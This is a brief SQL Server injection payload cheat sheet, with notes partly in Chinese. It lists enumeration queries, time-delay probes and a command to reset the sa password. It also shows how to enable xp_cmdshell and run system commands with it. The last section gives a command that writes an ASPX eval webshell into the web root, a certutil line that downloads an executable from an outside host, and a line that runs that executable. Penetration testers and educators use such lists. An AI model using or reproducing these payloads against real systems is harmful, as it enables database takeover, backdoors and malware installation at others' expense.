SQL Server Payload
=====================================

- Version 
    - ``SELECT @@version``
- Comment 
    - ``SELECT 1 -- comment``
    - ``SELECT /*comment*/1``
- Current User
    - ``SELECT user_name()``
    - ``SELECT system_user``
    - ``SELECT user``
    - ``SELECT loginame FROM master..sysprocesses WHERE spid = @@SPID``
- List User
    - ``SELECT name FROM master..syslogins``
- Current Database
    - ``SELECT DB_NAME()``
- List Database
    - ``SELECT name FROM master..sysdatabases``
- 命令执行
	- 前提：sa权限
		::
		
			select is_srvrolemember('sysadmin')
			select is_member('db_owner')
			select is_srvrolemember('public')
	- ``EXEC xp_cmdshell 'net user'``
- Ascii
    - ``SELECT char(0x41)``
    - ``SELECT ascii('A')``
    - ``SELECT char(65)+char(66)`` => return ``AB``
- Delay
    - ``WAITFOR DELAY '0:0:3'`` pause for 3 seconds
- Change Password
    - ``ALTER LOGIN [sa] WITH PASSWORD=N'NewPassword'``
- 写入文件
	+ xp_cmdshell
		::
		
			开启xp_cmdshell过程:
			exec sp_configure 'show advanced options', 1;   //开启高级选项
			RECONFIGURE; 									//配置生效
			exec sp_configure'xp_cmdshell', 1; 				//开启xp_cmdshell
			RECONFIGURE; 									//配置生效
			查看xp_cmdshell状态：exec sp_configure
			执行命令：exec master..xp_cmdshell 'whoami';
			写入webshell：exec master..xp_cmdshell 'echo  ^<%@ Page Language="Jscript"%^>^<%eval(Request.Item["pass"],"unsafe");%^> > c:\\WWW\\233.aspx'
			# 下载恶意程序
			exec master.dbo.xp_cmdshell 'cd c:\\www & certutil -urlcache -split -f http://ip/file.exe';
			执行程序
			exec master.dbo.xp_cmdshell 'cd c:\\www & file.exe';


